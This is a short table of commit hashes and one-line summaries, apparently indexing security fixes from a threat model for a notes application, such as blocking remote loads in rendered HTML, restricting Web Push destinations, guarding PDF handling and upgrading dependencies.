| `3c2451d` | This threat model |
| `771ff1c` | F1, F2: remote loads and overlays in rendered note HTML |
| `b2ea26e` | F9: `/\host` in a notification URL |
| `d95d502` | A date-dependent test (`TaskDetail`) that failed from 2026-11-02 on |
| `fb7fd76` | F4, F8: Web Push destinations; `push.json` owner-only |
| `8f96c33` | F3: PDF crash guard |
| `c4806cc` | F6: startup warning for an open identity configuration |
| `fad524c` | F7: npm overrides (`lodash-es`, `nanoid`) |
| `e62dbad` | F7: Spring Boot 4.1.2 (Tomcat, Jackson, Spring Framework) |
